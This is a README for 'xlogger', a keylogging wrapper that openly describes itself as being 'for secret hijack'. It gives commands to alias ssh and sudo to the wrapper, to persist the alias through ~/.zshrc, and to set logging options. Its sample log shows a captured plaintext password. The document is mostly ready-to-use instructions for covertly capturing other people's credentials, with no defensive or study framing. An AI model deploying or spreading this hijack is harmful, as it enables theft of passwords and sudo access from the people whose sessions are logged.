# xlogger

记录目标程序的所有键盘输入和终端输出日志。

You know, For secret hijack。

## 编译

```bash
make
```

## 用法

### 劫持 SSH

```bash
export XPROGRAM="/usr/bin/ssh"
export XLOGFILE="$HOME/ssh_logger.log"
alias ssh='/path/to/xlogger'
ssh root@server.example.com
```

### 劫持 Sudo

```bash
export XPROGRAM="/usr/bin/sudo"
export XLOGFILE="$HOME/sudo_logger.log"
alias sudo='/path/to/xlogger'
sudo -s
```

### 写入 ~/.zshrc 持久化

```bash
# xlogger: wrap ssh to log keyboard input and console output
export XPROGRAM="/usr/bin/ssh"
export XLOGFILE="$HOME/ssh_logger.log"
export XLOGINPUT=1
export XLOGOUTPUT=1
alias ssh='/path/to/xlogger'
```

## 环境变量

所有配置通过环境变量在运行时控制，无需重新编译：

| 环境变量 | 说明 | 默认值 |
|---|---|---|
| `XPROGRAM` | 被包装的目标程序路径 | `/usr/bin/sudo` |
| `XLOGFILE` | 日志文件路径 | `.xlogger.log` |
| `XLOGINPUT` | 是否记录键盘输入（`1`=是，`0`=否） | `1` |
| `XLOGOUTPUT` | 是否记录终端输出（`1`=是，`0`=否） | `1` |

### 示例

```bash
# 只记录键盘输入，不记录终端输出
export XLOGINPUT=1
export XLOGOUTPUT=0

# 只记录终端输出，不记录键盘输入
export XLOGINPUT=0
export XLOGOUTPUT=1

# 自定义日志路径
export XLOGFILE="/var/log/ssh_audit.log"
```

## 日志格式

日志保存在 `XLOGFILE` 指定的文件中（默认 `.xlogger.log`），格式如下：

```

=== New session started: /usr/bin/ssh ===
Arg[1]: root@server.example.com
=====================================
[2026-07-14 10:30:15] INPUT: root@server.example.com
[2026-07-14 10:30:16] OUTPUT: Password: 
[2026-07-14 10:30:20] INPUT: my-secret-password
=== Session ended with status: 0 ===

```

- 每行带时间戳
- `INPUT` 记录键盘输入，`OUTPUT` 记录终端输出
- 不可打印字符以 `\xNN`、`\t`、`\n`、`\r` 等形式转义
- 每个会话以 `=== New session started ===` 开始，`=== Session ended ===` 结束
